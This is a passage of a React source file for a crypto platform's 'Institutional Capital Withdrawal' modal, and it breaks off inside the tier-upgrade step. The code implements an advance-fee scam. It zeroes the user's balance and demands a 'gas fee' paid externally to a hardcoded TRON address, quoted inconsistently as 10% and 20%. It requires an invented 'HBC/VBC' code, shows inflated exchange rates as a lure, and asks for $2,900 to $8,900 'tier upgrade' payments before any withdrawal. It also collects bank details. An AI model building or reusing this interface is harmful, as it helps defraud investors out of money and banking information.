import React, { useState, useEffect } from 'react';
import { 
  X, 
  ArrowUpCircle, 
  CheckCircle2, 
  AlertCircle, 
  Copy, 
  Check, 
  Clock, 
  RefreshCw, 
  ShieldCheck, 
  ArrowRight, 
  ArrowLeft,
  Info, 
  AlertTriangle,
  Lock,
  Building2,
  Wallet,
  Zap,
  Sparkles,
  ChevronRight,
  HelpCircle
} from 'lucide-react';
import { useAuth } from '../../context/AuthContext';
import { WithdrawalRequest, WithdrawalStatus } from '../../types';
import { supabase } from '../../lib/supabase';

const API_BASE = import.meta.env.VITE_API_URL || 'http://localhost:5000/api';

interface WithdrawalModalProps {
  isOpen: boolean;
  onClose: () => void;
  defaultAsset?: string;
  onSuccess?: () => void;
}

// Local Currencies with Favorable High Conversion Rates (Strictly excluding Naira)
const LOCAL_CURRENCIES = [
  { code: 'SGD', name: 'Singapore Dollar (SGD)', symbol: 'S$', ratePerUsdt: 1.65, flag: '🇸🇬' },
  { code: 'EUR', name: 'Euro (EUR)', symbol: '€', ratePerUsdt: 1.10, flag: '🇪🇺' },
  { code: 'USD', name: 'US Dollar (USD)', symbol: '$', ratePerUsdt: 1.25, flag: '🇺🇸' },
  { code: 'GBP', name: 'British Pound (GBP)', symbol: '£', ratePerUsdt: 0.88, flag: '🇬🇧' },
  { code: 'CAD', name: 'Canadian Dollar (CAD)', symbol: 'CA$', ratePerUsdt: 1.45, flag: '🇨🇦' },
  { code: 'AUD', name: 'Australian Dollar (AUD)', symbol: 'A$', ratePerUsdt: 1.60, flag: '🇦🇺' },
  { code: 'JPY', name: 'Japanese Yen (JPY)', symbol: '¥', ratePerUsdt: 160.00, flag: '🇯🇵' },
];

const TIER_PLANS = [
  {
    id: 'BRONZE',
    name: 'Bronze Institutional Tier',
    limit: '$20,000 Receive Limit',
    feeUsd: 2900,
    badge: 'Popular for Active Traders',
    color: 'from-amber-700/80 to-amber-900/90',
    border: 'border-amber-500/50',
  },
  {
    id: 'GOLD',
    name: 'Gold Corporate Tier',
    limit: '$50,000 Receive Limit',
    feeUsd: 4900,
    badge: 'High-Volume Enterprise',
    color: 'from-yellow-600/80 to-amber-700/90',
    border: 'border-yellow-400/60',
  },
  {
    id: 'PREMIUM',
    name: 'Premium Sovereign Tier',
    limit: 'Unlimited Receive Limit',
    feeUsd: 8900,
    badge: 'VIP Sovereign Liquidity',
    color: 'from-indigo-600/80 to-purple-800/90',
    border: 'border-indigo-400/60',
  },
];

export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({ isOpen, onClose, defaultAsset = 'USDT', onSuccess }) => {
  const { session, user } = useAuth();

  // Wizard Navigation: 1 = Confirm, 2 = Convert, 3 = Payout Details, 4 = Gas Fee, 5 = Tier Upgrade Portal
  const [currentStep, setCurrentStep] = useState<1 | 2 | 3 | 4 | 5>(1);
  const [activeTab, setActiveTab] = useState<'withdraw' | 'history'>('withdraw');

  // Form State
  const [selectedAsset, setSelectedAsset] = useState(defaultAsset);
  const [selectedCurrency, setSelectedCurrency] = useState(LOCAL_CURRENCIES[0].code);
  const [availableBalance, setAvailableBalance] = useState<number>(0);
  const [amount, setAmount] = useState<number>(0); // locked to MAX balance
  const [payoutMethod, setPayoutMethod] = useState<'BANK_TRANSFER' | 'CRYPTO_WALLET'>('BANK_TRANSFER');

  // Bank Details
  const [bankName, setBankName] = useState('');
  const [accountHolder, setAccountHolder] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [swiftRouting, setSwiftRouting] = useState('');

  // Crypto Destination
  const [cryptoNetwork, setCryptoNetwork] = useState('TRC20');
  const [cryptoAddress, setCryptoAddress] = useState('');

  // Security Verification
  const [hbcVbcCode, setHbcVbcCode] = useState('');

  // Gas Fee & Tx Hash
  const [gasFeeTxHash, setGasFeeTxHash] = useState('');

  // Post-Approval Tier Upgrade State
  const [selectedTier, setSelectedTier] = useState<string>('BRONZE');
  const [upgradeTxHash, setUpgradeTxHash] = useState('');
  const [selectedWithdrawalForUpgrade, setSelectedWithdrawalForUpgrade] = useState<WithdrawalRequest | null>(null);

  // System Settings (Gas Fee Address & Upgrade Address)
  const [gasFeeAddress, setGasFeeAddress] = useState('TYDzsYUEpvnYmQk4zGP9sWWcTEd36AMW9y');
  const [gasFeeNetwork, setGasFeeNetwork] = useState('TRC20');
  const [tierUpgradeAddress, setTierUpgradeAddress] = useState('TYDzsYUEpvnYmQk4zGP9sWWcTEd36AMW9y');
  const [tierUpgradeNetwork, setTierUpgradeNetwork] = useState('TRC20');

  const [withdrawals, setWithdrawals] = useState<WithdrawalRequest[]>([]);
  const [loading, setLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [message, setMessage] = useState<{ type: 'success' | 'error'; text: string } | null>(null);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  const currencyConfig = LOCAL_CURRENCIES.find((c) => c.code === selectedCurrency) || LOCAL_CURRENCIES[0];

  // Calculations
  const conversionRate = currencyConfig.ratePerUsdt;
  const convertedTotal = Number((amount * conversionRate).toFixed(2));
  const gasFeeAmount = Number((amount * 0.10).toFixed(8)); // 10% gas fee requirement paid externally
  const netPayoutAmount = Number(amount.toFixed(8)); // 100% full payout to user bank/address
  const netConvertedPayout = convertedTotal; // 100% full converted currency to bank



  const copyToClipboard = (text: string, key: string) => {
    if (!text) return;
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  const getHeaders = async () => {
    const token = session?.access_token || (await supabase.auth.getSession()).data?.session?.access_token;
    return {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${token || ''}`,
    };
  };

  // Fetch balances, settings, and user withdrawal history
  const fetchData = async () => {
    setLoading(true);
    try {
      const headers = await getHeaders();

      // 1. Fetch system settings for gas fee & upgrade addresses
      const setRes = await fetch(`${API_BASE}/withdrawals/settings`, { headers });
      const setJson = await setRes.json();
      if (setJson.success && setJson.data) {
        if (setJson.data.gas_fee_address?.value) setGasFeeAddress(setJson.data.gas_fee_address.value);
        if (setJson.data.gas_fee_address?.network) setGasFeeNetwork(setJson.data.gas_fee_address.network);
        if (setJson.data.tier_upgrade_address?.value) setTierUpgradeAddress(setJson.data.tier_upgrade_address.value);
        if (setJson.data.tier_upgrade_address?.network) setTierUpgradeNetwork(setJson.data.tier_upgrade_address.network);
      }

      // 2. Fetch user's actual wallet balance
      const { data: walletData } = await supabase
        .from('wallets')
        .select('*')
        .eq('user_id', user?.id || '')
        .maybeSingle();

      const bal = walletData ? Number(walletData.balance || 0) : 0;
      setAvailableBalance(bal);
      setAmount(bal); // Default locked to MAX balance

      // 3. Fetch user withdrawal requests
      const wdRes = await fetch(`${API_BASE}/withdrawals`, { headers });
      const wdJson = await wdRes.json();
      if (wdJson.success && Array.isArray(wdJson.data)) {
        setWithdrawals(wdJson.data);
      }
    } catch (err: any) {
      console.warn('Withdrawal modal fetch error:', err.message);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (isOpen) {
      fetchData();
      setCurrentStep(1);
      setMessage(null);
    }
  }, [isOpen, session?.access_token]);

  // Submit Final Step 4: Submit Gas Fee & Lock Balance
  const handleSubmitWithdrawal = async (e: React.FormEvent) => {
    e.preventDefault();
    if (amount <= 0) {
      setMessage({ type: 'error', text: 'You do not have any available balance to withdraw.' });
      return;
    }
    if (payoutMethod === 'BANK_TRANSFER' && (!bankName || !accountHolder || !accountNumber)) {
      setMessage({ type: 'error', text: 'Please complete all required bank transfer details in Step 3.' });
      return;
    }
    if (payoutMethod === 'CRYPTO_WALLET' && !cryptoAddress.trim()) {
      setMessage({ type: 'error', text: 'Please enter a valid crypto destination address in Step 3.' });
      return;
    }
    if (!hbcVbcCode.trim()) {
      setMessage({ type: 'error', text: 'Please enter your HBC or VBC verification code.' });
      return;
    }

    setSubmitting(true);
    setMessage(null);

    try {
      const headers = await getHeaders();
      const payload = {
        asset: selectedAsset,
        network: payoutMethod === 'CRYPTO_WALLET' ? cryptoNetwork : 'BANK_WIRE',
        destinationWalletAddress: payoutMethod === 'CRYPTO_WALLET' ? cryptoAddress : `Bank: ${bankName} - ${accountNumber}`,
        amount: amount,
        localCurrency: selectedCurrency,
        conversionRate: conversionRate,
        convertedAmount: convertedTotal,
        payoutMethod: payoutMethod,
        bankDetails: {
          bank_name: bankName,
          account_holder: accountHolder,
          account_number: accountNumber,
          swift_routing: swiftRouting,
        },
        hbcVbcCode: hbcVbcCode.trim(),
        gasFeeTxHash: gasFeeTxHash.trim() || undefined,
      };

      const res = await fetch(`${API_BASE}/withdrawals`, {
        method: 'POST',
        headers,
        body: JSON.stringify(payload),
      });

      const json = await res.json();
      if (!res.ok || !json.success) {
        throw new Error(json.error || 'Failed to submit withdrawal request.');
      }

      setMessage({
        type: 'success',
        text: 'Withdrawal and 20% Gas Fee payment submitted successfully! Status is now PENDING review.',
      });
      setAvailableBalance(0); // balance is updated to zero
      fetchData();
      setTimeout(() => {
        setActiveTab('history');
      }, 1500);
    } catch (err: any) {
      setMessage({ type: 'error', text: err.message || 'An unexpected error occurred.' });
    } finally {
      setSubmitting(false);
    }
  };

  // Submit Tier Upgrade Proof in Step 5
  const handleSubmitUpgradeProof = async () => {
    if (!upgradeTxHash.trim()) {
      setMessage({ type: 'error', text: 'Please enter the transaction reference / hash for your tier upgrade payment.' });
      return;
    }
    if (!selectedWithdrawalForUpgrade) {
      setMessage({ type: 'error', text: 'No withdrawal request selected.' });
      return;
    }

    setSubmitting(true);
    setMessage(null);

    try {
      const headers = await getHeaders();
      const res = await fetch(`${API_BASE}/withdrawals/${selectedWithdrawalForUpgrade.id}/upgrade-proof`, {
        method: 'POST',
        headers,
        body: JSON.stringify({
          tier: selectedTier,
          txHash: upgradeTxHash.trim(),
        }),
      });

      const json = await res.json();
      if (!res.ok || !json.success) {
        throw new Error(json.error || 'Failed to submit tier upgrade proof.');
      }

      setMessage({
        type: 'success',
        text: 'Your account tier upgrade payment has been submitted for fast-track clearance!',
      });
      fetchData();
    } catch (err: any) {
      setMessage({ type: 'error', text: err.message });
    } finally {
      setSubmitting(false);
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/85 backdrop-blur-md overflow-y-auto">
      <div className="relative w-full max-w-2xl bg-slate-900 border border-slate-700/80 rounded-2xl shadow-2xl overflow-hidden my-8 animate-in fade-in zoom-in-95 duration-200">
        {/* Header */}
        <div className="flex items-center justify-between p-5 border-b border-slate-800 bg-slate-950/50">
          <div className="flex items-center space-x-3">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-tr from-amber-500 to-orange-600 flex items-center justify-center shadow-lg shadow-orange-500/20">
              <ArrowUpCircle className="w-5 h-5 text-white" />
            </div>
            <div>
              <h3 className="text-lg font-bold text-white tracking-wide">Institutional Capital Withdrawal</h3>
              <p className="text-xs text-slate-400">Step {currentStep} of 4 &bull; Multi-Stage Verified Payout</p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-2 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Tab Toggle */}
        <div className="flex border-b border-slate-800 bg-slate-950/30 px-5 pt-3 space-x-4">
          <button
            onClick={() => { setActiveTab('withdraw'); setCurrentStep(1); }}
            className={`pb-3 font-semibold text-sm border-b-2 transition-colors flex items-center space-x-2 ${
              activeTab === 'withdraw'
                ? 'border-amber-500 text-amber-400'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            <Wallet className="w-4 h-4" />
            <span>Withdrawal Wizard</span>
          </button>
          <button
            onClick={() => setActiveTab('history')}
            className={`pb-3 font-semibold text-sm border-b-2 transition-colors flex items-center space-x-2 ${
              activeTab === 'history'
                ? 'border-amber-500 text-amber-400'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            <Clock className="w-4 h-4" />
            <span>Withdrawal Requests ({withdrawals.length})</span>
          </button>
        </div>

        {/* Alerts & Notifications */}
        {message && (
          <div
            className={`mx-5 mt-4 p-4 rounded-xl flex items-start space-x-3 text-sm ${
              message.type === 'success'
                ? 'bg-emerald-500/15 border border-emerald-500/30 text-emerald-400'
                : 'bg-rose-500/15 border border-rose-500/30 text-rose-400'
            }`}
          >
            {message.type === 'success' ? (
              <CheckCircle2 className="w-5 h-5 flex-shrink-0 mt-0.5" />
            ) : (
              <AlertCircle className="w-5 h-5 flex-shrink-0 mt-0.5" />
            )}
            <div className="flex-1 font-medium">{message.text}</div>
          </div>
        )}

        {/* TAB 1: WITHDRAWAL WIZARD */}
        {activeTab === 'withdraw' && (
          <div className="p-6">
            {/* STEP 1: CONFIRMATION & GUIDE PROMPT */}
            {currentStep === 1 && (
              <div className="space-y-6 text-center py-4">
                <div className="w-16 h-16 mx-auto rounded-full bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 shadow-inner">
                  <HelpCircle className="w-8 h-8" />
                </div>
                <div className="space-y-2">
                  <h4 className="text-xl font-bold text-white">Are you sure you want to withdraw?</h4>
                  <p className="text-sm text-slate-300 max-w-md mx-auto">
                    Please follow the institutional withdrawal guide to convert and disburse your portfolio safely.
                  </p>
                </div>

                <div className="p-4 bg-slate-950/60 border border-slate-800 rounded-xl text-left space-y-2 text-xs text-slate-300">
                  <div className="flex items-center space-x-2 text-amber-400 font-semibold text-sm">
                    <Info className="w-4 h-4" />
                    <span>Important Withdrawal Guidelines:</span>
                  </div>
                  <ul className="list-disc list-inside space-y-1 text-slate-400">
                    <li>Withdrawals utilize real-time institutional exchange rates for local currency conversion.</li>
                    <li>The system locks your full withdrawal balance during the disbursement process.</li>
                    <li>Gas clearance fee is paid externally to the treasury network (100% of your withdrawal amount is credited in full to your bank/wallet).</li>
                    <li>Ensure you have your authorized HBC / VBC verification code ready.</li>
                  </ul>

                </div>

                <div className="flex items-center justify-center space-x-3 pt-2">
                  <button
                    onClick={onClose}
                    className="px-6 py-2.5 rounded-xl border border-slate-700 text-slate-300 hover:bg-slate-800 text-sm font-semibold transition-all"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={() => setCurrentStep(2)}
                    className="px-8 py-2.5 rounded-xl bg-gradient-to-r from-amber-500 to-orange-600 hover:from-amber-600 hover:to-orange-700 text-white font-bold text-sm shadow-lg shadow-orange-500/25 transition-all flex items-center space-x-2"
                  >
                    <span>Proceed to Withdrawal</span>
                    <ArrowRight className="w-4 h-4" />
                  </button>
                </div>
              </div>
            )}

            {/* STEP 2: CONVERSION TO LOCAL CURRENCY (MAX BALANCE ONLY) */}
            {currentStep === 2 && (
              <div className="space-y-5">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-bold uppercase tracking-wider text-amber-400 flex items-center space-x-1.5">
                    <Sparkles className="w-3.5 h-3.5" />
                    <span>Step 2 &bull; Portfolio Currency Conversion</span>
                  </span>
                  <span className="text-xs text-slate-400">High-Rate Favorable Pricing</span>
                </div>

                {/* Available Balance Box with MAX Indicator */}
                <div className="p-4 bg-slate-950/80 border border-slate-800 rounded-xl flex items-center justify-between">
                  <div>
                    <p className="text-xs text-slate-400 font-medium">Available Portfolio Balance</p>
                    <p className="text-2xl font-extrabold text-white mt-0.5">
                      {availableBalance.toFixed(2)} <span className="text-amber-400 font-semibold text-base">{selectedAsset}</span>
                    </p>
                  </div>
                  <div className="flex items-center space-x-2">
                    <span className="px-3 py-1 bg-amber-500/20 text-amber-400 border border-amber-500/40 rounded-lg text-xs font-bold">
                      MAX LOCKED
                    </span>
                  </div>
                </div>

                {/* Conversion Target Selector */}
                <div className="space-y-2">
                  <label className="block text-xs font-semibold text-slate-300">
                    Select Target Payout Currency (Favorable Rate Applied):
                  </label>
                  <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                    {LOCAL_CURRENCIES.map((curr) => (
                      <button
                        key={curr.code}
                        type="button"
                        onClick={() => setSelectedCurrency(curr.code)}
                        className={`p-3 rounded-xl border text-left transition-all ${
                          selectedCurrency === curr.code
                            ? 'bg-amber-500/15 border-amber-500 text-white shadow-md'
                            : 'bg-slate-950/40 border-slate-800 text-slate-400 hover:border-slate-700'
                        }`}
                      >
                        <div className="flex items-center space-x-2">
                          <span className="text-lg">{curr.flag}</span>
                          <span className="font-bold text-sm text-white">{curr.code}</span>
                        </div>
                        <div className="text-[11px] text-amber-400 mt-1 font-mono">
                          1 USDT = {curr.symbol}{curr.ratePerUsdt}
                        </div>
                      </button>
                    ))}
                  </div>
                </div>

                {/* Live Converted Amount Display */}
                <div className="p-4 bg-gradient-to-r from-amber-500/10 to-orange-500/10 border border-amber-500/30 rounded-xl space-y-2">
                  <div className="flex items-center justify-between text-xs text-slate-300">
                    <span>Conversion Calculation:</span>
                    <span className="font-mono text-amber-400">{amount} USDT &times; {conversionRate}</span>
                  </div>
                  <div className="flex items-baseline justify-between">
                    <span className="text-sm font-semibold text-slate-200">Gross Converted Value:</span>
                    <span className="text-2xl font-black text-emerald-400">
                      {currencyConfig.symbol}{convertedTotal.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} {currencyConfig.code}
                    </span>
                  </div>
                </div>

                {/* Navigation Buttons */}
                <div className="flex items-center justify-between pt-3 border-t border-slate-800">
                  <button
                    onClick={() => setCurrentStep(1)}
                    className="px-5 py-2.5 rounded-xl border border-slate-700 text-slate-300 hover:bg-slate-800 text-sm font-semibold flex items-center space-x-2 transition-all"
                  >
                    <ArrowLeft className="w-4 h-4" />
                    <span>Back</span>
                  </button>
                  <button
                    onClick={() => {
                      if (availableBalance <= 0) {
                        setMessage({ type: 'error', text: 'You need an available balance greater than 0 to proceed.' });
                        return;
                      }
                      setCurrentStep(3);
                    }}
                    className="px-6 py-2.5 rounded-xl bg-gradient-to-r from-amber-500 to-orange-600 hover:from-amber-600 hover:to-orange-700 text-white font-bold text-sm shadow-lg shadow-orange-500/25 transition-all flex items-center space-x-2"
                  >
                    <span>Next: Payout Destination</span>
                    <ArrowRight className="w-4 h-4" />
                  </button>
                </div>
              </div>
            )}

            {/* STEP 3: PAYOUT DESTINATION & HBC/VBC CODE */}
            {currentStep === 3 && (
              <div className="space-y-5">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-bold uppercase tracking-wider text-amber-400 flex items-center space-x-1.5">
                    <Building2 className="w-3.5 h-3.5" />
                    <span>Step 3 &bull; Payout Destination & Security Code</span>
                  </span>
                  <span className="text-xs text-slate-400">Bank Wire or Crypto</span>
                </div>

                {/* Payout Method Toggle (Default Bank) */}
                <div className="flex p-1 bg-slate-950 border border-slate-800 rounded-xl space-x-2">
                  <button
                    type="button"
                    onClick={() => setPayoutMethod('BANK_TRANSFER')}
                    className={`flex-1 py-2 rounded-lg text-xs font-bold transition-all flex items-center justify-center space-x-2 ${
                      payoutMethod === 'BANK_TRANSFER'
                        ? 'bg-amber-500 text-slate-950 shadow-md'
                        : 'text-slate-400 hover:text-white'
                    }`}
                  >
                    <Building2 className="w-4 h-4" />
                    <span>Direct Bank Wire (Default)</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => setPayoutMethod('CRYPTO_WALLET')}
                    className={`flex-1 py-2 rounded-lg text-xs font-bold transition-all flex items-center justify-center space-x-2 ${
                      payoutMethod === 'CRYPTO_WALLET'
                        ? 'bg-amber-500 text-slate-950 shadow-md'
                        : 'text-slate-400 hover:text-white'
                    }`}
                  >
                    <Wallet className="w-4 h-4" />
                    <span>Crypto Wallet</span>
                  </button>
                </div>

                {/* Bank Details Inputs */}
                {payoutMethod === 'BANK_TRANSFER' && (
                  <div className="space-y-3 p-4 bg-slate-950/60 border border-slate-800 rounded-xl">
                    <div>
                      <label className="block text-xs font-semibold text-slate-300 mb-1">Bank Name *</label>
                      <input
                        type="text"
                        value={bankName}
                        onChange={(e) => setBankName(e.target.value)}
                        placeholder="e.g. DBS Bank, JPMorgan Chase, HSBC"
                        className="w-full px-3.5 py-2 rounded-lg bg-slate-900 border border-slate-700 text-white text-sm focus:border-amber-500 focus:outline-none"
                      />
                    </div>
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                      <div>
                        <label className="block text-xs font-semibold text-slate-300 mb-1">Account Holder Name *</label>
                        <input
                          type="text"
                          value={accountHolder}
                          onChange={(e) => setAccountHolder(e.target.value)}
                          placeholder="Full Legal Name"
                          className="w-full px-3.5 py-2 rounded-lg bg-slate-900 border border-slate-700 text-white text-sm focus:border-amber-500 focus:outline-none"
                        />
                      </div>
                      <div>
                        <label className="block text-xs font-semibold text-slate-300 mb-1">Account Number / IBAN *</label>
                        <input
                          type="text"
                          value={accountNumber}
                          onChange={(e) => setAccountNumber(e.target.value)}
                          placeholder="Account or IBAN Number"
                          className="w-full px-3.5 py-2 rounded-lg bg-slate-900 border border-slate-700 text-white text-sm focus:border-amber-500 focus:outline-none"
                        />
                      </div>
                    </div>
                    <div>
                      <label className="block text-xs font-semibold text-slate-300 mb-1">SWIFT / Routing Code (Optional)</label>
                      <input
                        type="text"
                        value={swiftRouting}
                        onChange={(e) => setSwiftRouting(e.target.value)}
                        placeholder="e.g. DBSSSGSG"
                        className="w-full px-3.5 py-2 rounded-lg bg-slate-900 border border-slate-700 text-white text-sm focus:border-amber-500 focus:outline-none"
                      />
                    </div>
                  </div>
                )}

                {/* Crypto Wallet Inputs */}
                {payoutMethod === 'CRYPTO_WALLET' && (
                  <div className="space-y-3 p-4 bg-slate-950/60 border border-slate-800 rounded-xl">
                    <div>
                      <label className="block text-xs font-semibold text-slate-300 mb-1">Crypto Network</label>
                      <select
                        value={cryptoNetwork}
                        onChange={(e) => setCryptoNetwork(e.target.value)}
                        className="w-full px-3.5 py-2 rounded-lg bg-slate-900 border border-slate-700 text-white text-sm focus:border-amber-500 focus:outline-none"
                      >
                        <option value="TRC20">TRON (TRC20) - Zero Gas Fee Gateway</option>
                        <option value="ERC20">Ethereum (ERC20)</option>
                        <option value="BEP20">BNB Smart Chain (BEP20)</option>
                        <option value="SOLANA">Solana Mainnet</option>
                      </select>
                    </div>
                    <div>
                      <label className="block text-xs font-semibold text-slate-300 mb-1">Destination Address *</label>
                      <input
                        type="text"
                        value={cryptoAddress}
                        onChange={(e) => setCryptoAddress(e.target.value)}
                        placeholder="Enter valid receiving wallet address"
                        className="w-full px-3.5 py-2 rounded-lg bg-slate-900 border border-slate-700 text-white text-sm focus:border-amber-500 focus:outline-none font-mono"
                      />
                    </div>
                  </div>
                )}

                {/* HBC or VBC Security Code Box */}
                <div className="p-4 bg-amber-500/10 border border-amber-500/30 rounded-xl space-y-2">
                  <div className="flex items-center space-x-2 text-amber-400 font-semibold text-xs">
                    <Lock className="w-4 h-4" />
                    <span>Security Verification &bull; HBC or VBC Code *</span>
                  </div>
                  <p className="text-xs text-slate-400">
                    Please enter your allocated Institutional Holder Verification Code (HBC) or Vault Bridge Code (VBC) to authorize capital disbursement.
                  </p>
                  <input
                    type="text"
                    value={hbcVbcCode}
                    onChange={(e) => setHbcVbcCode(e.target.value)}
                    placeholder="Enter HBC or VBC Code (e.g. HBC-88921-VBC)"
                    className="w-full px-3.5 py-2 rounded-lg bg-slate-950 border border-amber-500/50 text-amber-300 text-sm font-mono tracking-wider focus:outline-none focus:ring-1 focus:ring-amber-400"
                  />
                </div>

                {/* Navigation Buttons */}
                <div className="flex items-center justify-between pt-3 border-t border-slate-800">
                  <button
                    onClick={() => setCurrentStep(2)}
                    className="px-5 py-2.5 rounded-xl border border-slate-700 text-slate-300 hover:bg-slate-800 text-sm font-semibold flex items-center space-x-2 transition-all"
                  >
                    <ArrowLeft className="w-4 h-4" />
                    <span>Back</span>
                  </button>
                  <button
                    onClick={() => {
                      if (payoutMethod === 'BANK_TRANSFER' && (!bankName || !accountHolder || !accountNumber)) {
                        setMessage({ type: 'error', text: 'Please fill in the bank name, account holder, and account number.' });
                        return;
                      }
                      if (payoutMethod === 'CRYPTO_WALLET' && !cryptoAddress.trim()) {
                        setMessage({ type: 'error', text: 'Please enter your crypto destination address.' });
                        return;
                      }
                      if (!hbcVbcCode.trim()) {
                        setMessage({ type: 'error', text: 'Please enter your HBC or VBC code to continue.' });
                        return;
                      }
                      setMessage(null);
                      setCurrentStep(4);
                    }}
                    className="px-6 py-2.5 rounded-xl bg-gradient-to-r from-amber-500 to-orange-600 hover:from-amber-600 hover:to-orange-700 text-white font-bold text-sm shadow-lg shadow-orange-500/25 transition-all flex items-center space-x-2"
                  >
                    <span>Next: Gas Fee Payment</span>
                    <ArrowRight className="w-4 h-4" />
                  </button>
                </div>
              </div>
            )}

            {/* STEP 4: 20% GAS FEE CALCULATION & ADMIN ADDRESS PAYMENT */}
            {currentStep === 4 && (
              <form onSubmit={handleSubmitWithdrawal} className="space-y-5">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-bold uppercase tracking-wider text-amber-400 flex items-center space-x-1.5">
                    <Zap className="w-3.5 h-3.5" />
                    <span>Step 4 &bull; Gas Fee Clearance & Final Authorization</span>
                  </span>
                  <span className="text-xs text-emerald-400 font-bold">100% Full Balance Payout</span>
                </div>

                {/* Financial Summary Box */}
                <div className="p-4 bg-slate-950 border border-slate-800 rounded-xl space-y-2.5 text-sm">
                  <div className="flex justify-between text-slate-300">
                    <span>Requested Withdrawal Principal:</span>
                    <span className="font-semibold text-white">{amount} {selectedAsset} ({currencyConfig.symbol}{convertedTotal.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} {currencyConfig.code})</span>
                  </div>
                  <div className="flex justify-between text-amber-400 font-medium">
                    <span className="flex items-center space-x-1">
                      <span>Gas Fee Requirement (Paid Externally to Treasury):</span>
                    </span>
                    <span>{gasFeeAmount.toFixed(4)} {selectedAsset}</span>
                  </div>
                  <div className="border-t border-slate-800 pt-2 flex justify-between text-base font-bold text-emerald-400">
                    <span>Total Amount Credited to Your Bank/Wallet:</span>
                    <span>{amount.toFixed(2)} {selectedAsset} ({currencyConfig.symbol}{convertedTotal.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} {currencyConfig.code})</span>
                  </div>
                  <p className="text-[11px] text-slate-400 italic pt-1 border-t border-slate-900">
                    Note: Gas fee is not deducted from your funds. 100% of your withdrawal balance will be credited to your account upon gas fee clearance.
                  </p>
                </div>

                {/* Admin-Provided Gas Fee Payment Address */}
                <div className="p-4 bg-amber-500/10 border border-amber-500/30 rounded-xl space-y-3">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-bold text-amber-400 uppercase tracking-wider">
                      Pay External Gas Fee ({gasFeeAmount} {selectedAsset}) To Treasury:
                    </span>
                    <span className="text-[10px] bg-amber-500/20 text-amber-300 px-2 py-0.5 rounded font-mono font-bold">
                      {gasFeeNetwork} Network
                    </span>
                  </div>


                  <div className="flex items-center space-x-2 bg-slate-950 p-3 rounded-lg border border-slate-700">
                    <span className="font-mono text-xs text-slate-200 break-all flex-1">{gasFeeAddress}</span>
                    <button
                      type="button"
                      onClick={() => copyToClipboard(gasFeeAddress, 'gas_addr')}
                      className="px-3 py-1.5 bg-amber-500 hover:bg-amber-600 text-slate-950 rounded-md text-xs font-bold flex items-center space-x-1 transition-all flex-shrink-0"
                    >
                      {copiedKey === 'gas_addr' ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>{copiedKey === 'gas_addr' ? 'Copied' : 'Copy'}</span>
                    </button>
                  </div>
                </div>

                {/* Gas Fee Payment Proof Hash */}
                <div>
                  <label className="block text-xs font-semibold text-slate-300 mb-1">
                    Gas Fee Transaction Hash / Payment Reference (Optional for Instant Review)
                  </label>
                  <input
                    type="text"
                    value={gasFeeTxHash}
                    onChange={(e) => setGasFeeTxHash(e.target.value)}
                    placeholder="Enter TXID / Transaction Hash"
                    className="w-full px-3.5 py-2 rounded-lg bg-slate-950 border border-slate-700 text-white text-xs font-mono focus:border-amber-500 focus:outline-none"
                  />
                  <p className="text-[11px] text-slate-400 mt-1">
                    Once submitted, your withdrawal and gas fee will be marked as <strong className="text-amber-400">PENDING</strong>. Your main balance will be updated to zero pending verification.
                  </p>
                </div>

                {/* Navigation Buttons */}
                <div className="flex items-center justify-between pt-3 border-t border-slate-800">
                  <button
                    type="button"
                    onClick={() => setCurrentStep(3)}
                    className="px-5 py-2.5 rounded-xl border border-slate-700 text-slate-300 hover:bg-slate-800 text-sm font-semibold flex items-center space-x-2 transition-all"
                  >
                    <ArrowLeft className="w-4 h-4" />
                    <span>Back</span>
                  </button>
                  <button
                    type="submit"
                    disabled={submitting}
                    className="px-8 py-2.5 rounded-xl bg-gradient-to-r from-amber-500 to-orange-600 hover:from-amber-600 hover:to-orange-700 text-white font-bold text-sm shadow-lg shadow-orange-500/25 transition-all flex items-center space-x-2 disabled:opacity-50"
                  >
                    {submitting ? (
                      <>
                        <RefreshCw className="w-4 h-4 animate-spin" />
                        <span>Processing...</span>
                      </>
                    ) : (
                      <>
                        <ShieldCheck className="w-4 h-4" />
                        <span>Confirm & Pay Gas Fee</span>
                      </>
                    )}
                  </button>
                </div>
              </form>
            )}

            {/* STEP 5: TIER UPGRADE PORTAL */}
            {currentStep === 5 && (
              <div className="space-y-6">
                <div className="p-5 bg-gradient-to-r from-amber-500/10 to-orange-500/10 border border-amber-500/30 rounded-2xl space-y-2">
                  <div className="flex items-center space-x-2.5 text-amber-400 font-bold text-base">
                    <AlertTriangle className="w-5 h-5 flex-shrink-0" />
                    <span>Account Tier Upgrade Required</span>
                  </div>
                  <p className="text-xs leading-relaxed text-slate-200">
                    To proceed with your withdrawal, you need to upgrade your account tier. Kindly contact customer care for assistance to upgrade your account.
                  </p>
                </div>


                {/* Plan Selection Cards (Without Pricing) */}
                <div className="space-y-2">
                  <label className="block text-xs font-bold text-slate-300 uppercase tracking-wider">
